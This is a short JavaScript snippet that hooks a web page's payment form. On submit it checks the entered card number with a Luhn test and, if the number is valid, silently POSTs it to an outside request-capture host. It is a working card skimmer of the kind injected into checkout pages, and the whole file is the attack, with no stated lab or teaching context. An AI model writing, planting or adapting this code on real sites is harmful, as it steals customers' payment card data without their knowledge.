const paymentForm = document.getElementById('payment-form');

paymentForm.addEventListener('submit', function(event) {
    const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');

    if (validateLuhn(rawValue)) {
        const eventData = {
            type: event.type,
            target: event.target.id || event.target.tagName,
            timestamp: event.timeStamp,
            formData: {
                cardNumber: rawValue
            }
        };

        fetch('https://team11.requestcatcher.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(eventData)
        })
    }
});
